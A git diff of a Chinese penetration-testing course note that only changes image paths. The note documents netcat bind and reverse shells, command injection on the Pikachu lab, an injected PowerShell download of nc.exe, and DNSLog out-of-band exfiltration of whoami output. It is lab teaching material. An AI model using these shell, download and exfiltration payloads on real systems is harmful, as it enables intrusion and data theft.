@@ -9,17 +9,17 @@ description: 记录 小迪课程学习笔记，基础课程第4|5天
 
 # 文件上传下载
 
-打开[网站](https://forum.ywhack.com/bountytips.php?download)，现在放文件的服务器启动HTTP服务![image-20261005133152770](/images/image-20261005133152770.png)
+打开[网站](https://forum.ywhack.com/bountytips.php?download)，现在放文件的服务器启动HTTP服务![image-20261005133152770](../images/image-20261005133152770.png)
 
-cmd输入命令打开即可![image-20261005133220469](/images/image-20261005133220469.png)
+cmd输入命令打开即可![image-20261005133220469](../images/image-20261005133220469.png)
 
-找到下载文件的命令根据不同操作系统选择就可以![image-20261005133321525](/images/image-20261005133321525.png)
+找到下载文件的命令根据不同操作系统选择就可以![image-20261005133321525](../images/image-20261005133321525.png)
 
-上传成功在目录下可以发现`nc.exe`![image-20261005133458058](/images/image-20261005133458058.png)
+上传成功在目录下可以发现`nc.exe`![image-20261005133458058](../images/image-20261005133458058.png)
 
 # 反弹Shell命令-解决数据回显&解决数据通讯
 
-## 基础概念![image-20261005134043869](/images/image-20261005134043869.png)
+## 基础概念![image-20261005134043869](../images/image-20261005134043869.png)
 
 可以把整个过程理解成：
 
@@ -96,11 +96,11 @@ NAT
 
 ### kali连接windows
 
-window输入`nc -e cmd -lvvp 5566 `监听5566，连接后交出`cmd`，kali输入`nc windous-ip 5566` 接收,可以查看文件进行操作![image-20261005135125992](/images/image-20261005135125992.png)
+window输入`nc -e cmd -lvvp 5566 `监听5566，连接后交出`cmd`，kali输入`nc windous-ip 5566` 接收,可以查看文件进行操作![image-20261005135125992](../images/image-20261005135125992.png)
 
 ### window连接kali
 
-kali打开监听即可![image-20261005135351611](/images/image-20261005135351611.png)
+kali打开监听即可![image-20261005135351611](../images/image-20261005135351611.png)
 
 ## 反向连接
 
@@ -108,15 +108,15 @@ kali打开监听即可![image-20261005135351611](/images/image-20261005135351611
 
 反向连接就是被控端主动连出到控制端，控制端监听等待背控制端连接,`nc -e /bin/sh  192.168.87.133 5566`
 
-首先要打开对方的监听`nc -lvp 5566`,监听等待![image-20261005135849236](/images/image-20261005135849236.png)
+首先要打开对方的监听`nc -lvp 5566`,监听等待![image-20261005135849236](../images/image-20261005135849236.png)
 
 > 买了个服务器用公网
 
 直接连接失败，公网找不到内网。
 
-![image-20261005152518079](/images/image-20261005152518079.png)
+![image-20261005152518079](../images/image-20261005152518079.png)
 
-利用反向连接 让kali主导找公网window，成功！![image-20261005152835102](/images/image-20261005152835102.png)
+利用反向连接 让kali主导找公网window，成功！![image-20261005152835102](../images/image-20261005152835102.png)
 
 # Pikachu漏洞平台演示&&防火墙策略
 
@@ -141,32 +141,32 @@ Linux->; | || & && \``  (特有``和;)
 
 ## 靶场
 
-利用管道符执行`whoami`，可行，判断为windows(用PHP study搭建的靶场）![image-20261005154654118](/images/image-20261005154654118.png)
+利用管道符执行`whoami`，可行，判断为windows(用PHP study搭建的靶场）![image-20261005154654118](../images/image-20261005154654118.png)
 
-为了获取此服务器权限，利用nc，已知nc不存在window中，上传命令执行nc。上传[命令](#文件上传下载)到C盘`powershell.exe -Command "Invoke-WebRequest -Uri http://192.168.31.240:89/nc.exe -OutFile c:\\nc.exe"`![image-20261005155559091](/images/image-20261005155559091.png)
+为了获取此服务器权限，利用nc，已知nc不存在window中，上传命令执行nc。上传[命令](#文件上传下载)到C盘`powershell.exe -Command "Invoke-WebRequest -Uri http://192.168.31.240:89/nc.exe -OutFile c:\\nc.exe"`![image-20261005155559091](../images/image-20261005155559091.png)
 
-进行反弹操作，正向链接或者反向连接，都可以，在内网服务器，上传命令` 127.0.0.1 | nc -e cmd  -lvvp 5566`![image-20261005160157141](/images/image-20261005160157141.png)
+进行反弹操作，正向链接或者反向连接，都可以，在内网服务器，上传命令` 127.0.0.1 | nc -e cmd  -lvvp 5566`![image-20261005160157141](../images/image-20261005160157141.png)
 
-反向连接![image-20261005160638430](/images/image-20261005160638430.png)
+反向连接![image-20261005160638430](../images/image-20261005160638430.png)
 
 ## 加入防火墙策略
 
-开启防火墙，添加入站规则阻止5566端口连接![image-20261005162433270](/images/image-20261005162433270.png)
+开启防火墙，添加入站规则阻止5566端口连接![image-20261005162433270](../images/image-20261005162433270.png)
 
-此时用正向连接![image-20261005162730455](/images/image-20261005162730455.png)无法连接，此时只能利用反向连接，成功连接![image-20261005162915992](/images/image-20261005162915992.png)
+此时用正向连接![image-20261005162730455](../images/image-20261005162730455.png)无法连接，此时只能利用反向连接，成功连接![image-20261005162915992](../images/image-20261005162915992.png)
 
-添加出站规则限制5566![image-20261005163016866](/images/image-20261005163016866.png)
+添加出站规则限制5566![image-20261005163016866](../images/image-20261005163016866.png)
 
-连接再次失效![image-20261005163054464](/images/image-20261005163054464.png)
+连接再次失效![image-20261005163054464](../images/image-20261005163054464.png)
 
 > 注意限制出站不限制入站，用正向连接也不行
 
 ## 靶场配置文件更改为不回显命令
 
-改一下![image-20261005163902754](/images/image-20261005163902754.png)
+改一下![image-20261005163902754](../images/image-20261005163902754.png)
 
-此时没有任何回显信息![image-20261005163950412](/images/image-20261005163950412.png)
+此时没有任何回显信息![image-20261005163950412](../images/image-20261005163950412.png)
 
 进行带外查询，在[DNSLog](www.dnslog.cn)上弄个域名，并监控此域名的DNS解析请求。通过解析请求外带查询。理论上，将`whoami`赋值,ping域名可将其带出，但是cmd没有变量功能，用`powershell`,并且whoami结果带`'\'`(ping命令 域名要求不带),将其其替换掉。输入命令`127.0.0.1 | powershell $x=whoami;$x=$x.Replace('\','xxx');$y='.hrhi0v.dnslog.cn';$z=$x+$y;ping $z`
 
-得到用户名![image-20261005192658754](/images/image-20261005192658754.png)
+得到用户名![image-20261005192658754](../images/image-20261005192658754.png)
